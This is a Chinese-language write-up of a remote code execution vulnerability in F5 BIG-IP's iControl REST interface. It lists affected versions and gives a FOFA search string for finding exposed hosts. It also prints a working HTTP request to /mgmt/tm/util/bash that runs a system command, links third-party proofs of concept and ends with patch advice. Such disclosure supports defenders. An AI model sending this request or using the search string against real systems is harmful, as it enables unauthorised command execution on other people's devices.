# F5 BIG-IP

F5 BIG-IP 链路控制器用于最大限度提升链路性能与可用性的下一代广域网链路流量管理。

# 漏洞简介

F5 BIG-IP 存在代码执行漏洞，该漏洞允许定义身份验证的攻击者通过 BIG-IP 管理界面和自身IP地址对 iControl REST
接口进行网络访问，以执行任意系统命令，控制目标机器。

# 影响版本

F5 BIG-IP 16.0.0-16.0.1  
F5 BIG-IP 15.1.0-15.1.2  
F5 BIG-IP 14.1.0-14.1.3.1  
F5 BIG-IP 13.1.0-13.1.3.5  
F5 BIG-IP 12.1.0-12.1.5.2  
F5 BIG-IQ 7.1.0-7.1.0.2  
F5 BIG-IQ 7.0.0-7.0.0.1  
F5 BIG-IQ 6.0.0-6.1.0

# 漏洞复现

fofa搜索关键词：

`body="F5 Networks, Inc"`

![](https://image.3001.net/images/20210322/1616382472_60580a08e9130835c2a34.png!small)

打开首页如下：

![](https://image.3001.net/images/20210322/1616382473_60580a0984e62f97e6e4f.png!small)

构造请求数据包，执行任意命令：

    
    
    POST /mgmt/tm/util/bash HTTP/1.1
    Host: 192.168.1.123:8443
    Connection: close
    Content-Length: 39
    Cache-Control: max-age=0
    Authorization: Basic YWRtaW46QVNhc1M=
    X-F5-Auth-Token: 
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    
    {"command":"run","utilCmdArgs":"-c id"}
    

![](https://image.3001.net/images/20210322/1616382474_60580a0a263c849c6b153.png!small)

# POC

已有多位师傅放出了POC：

PeiQi:  
<https://mp.weixin.qq.com/s/ZtE7R4PPgdWY9ea06A9wqQ>

S1xHcL:  
<https://github.com/S1xHcL/f5_rce_poc>

# 修复建议

F5官方已发布相关安全更新，广大用户需及时更新到最新版本。  
下载链接：  
https://support.f5.com/csp/article/K02566623

